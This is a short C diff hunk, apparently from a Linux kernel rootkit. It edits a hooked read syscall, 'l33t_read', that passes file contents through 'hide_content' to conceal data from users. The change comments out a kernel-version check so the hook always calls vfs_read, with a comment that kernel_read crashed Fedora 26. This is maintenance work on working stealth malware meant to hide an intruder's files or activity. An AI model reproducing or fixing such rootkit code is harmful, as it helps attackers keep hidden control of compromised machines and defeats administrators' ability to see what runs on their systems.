@@ -535,11 +535,13 @@ asmlinkage ssize_t l33t_read(int fd, void *buf, size_t nbytes) {
 		f = e_fget_light(fd, &fput_needed);
 
 		if (f) {
-#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
+//#if LINUX_VERSION_CODE <= KERNEL_VERSION(4, 14, 0)
 			ret = vfs_read(f, buf, nbytes, &f->f_pos);
-#else
-			ret = kernel_read(f, buf, nbytes, &f->f_pos);
-#endif
+//#else
+//			This is crashing Fedora 26 with kernel 4.16.7-100.fc26.x86_64
+
+//			ret = kernel_read(f, buf, nbytes, &f->f_pos);
+//#endif
 			if(f_check(buf, ret) == 1) ret = hide_content(buf, ret);
 	    	
 			fput_light(f, fput_needed);
